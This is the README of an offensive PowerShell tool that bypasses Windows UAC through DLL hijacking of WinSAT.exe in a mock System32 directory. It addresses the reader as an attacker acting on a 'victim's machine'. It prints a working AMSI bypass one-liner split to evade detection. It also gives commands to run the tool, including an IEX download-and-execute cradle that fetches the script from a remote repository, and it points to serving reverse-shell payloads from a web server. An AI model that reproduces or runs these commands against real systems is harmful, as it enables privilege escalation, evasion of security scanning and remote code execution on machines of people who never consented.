# Invoke-WinSATBypass

## Description

This script will create a mock directory of `"C:\Windows\System32"` and copy a legitimate application of Windows (`WinSAT.exe`) into it. 

It will after try to download a DLL called `version.dll`, which is loaded by default by `WinSAT.exe`, in order to perform a UAC Bypass by doing some DLL Hijacking.

There is a pre-compiled DLL in the project folder that will only launch a CMD instance as Administrator. 

If you want to execute any other payload (reverse-shell, user add-on, etc...), you will need to compile a DLL yourself and serve it on your local web server

## Demo
![Demo](/img/demo.gif)

## How to Run Invoke-WinSATBypass
---

### AMSI Bypass

In most case, running this script will require us to bypass the Antimalware Scan Interface (AMSI). We can do so by typing the following command in a Powershell instance

```
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+"Utils").GetField("amsiInit"+"Failed","NonPublic,Static").SetValue($null,$true);
```
### Running the script locally

If you got the script locally on the victim's machine, you can run the script like this:

```
. .\Invoke-WinSATBypass.ps1
Invoke-WinSATBypass -HTTPServerIP [IP_ADDRESS]
```

### Running the script as a string downloaded from the repo

If you prefer to fetch the script directly from the repo without having it on the disk:

```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/b4keSn4ke/Invoke-WinSATBypass/main/Invoke-WinSATBypass.ps1');
Invoke-WinSATBypass -HTTPServerIP [IP_ADDRESS]
```
---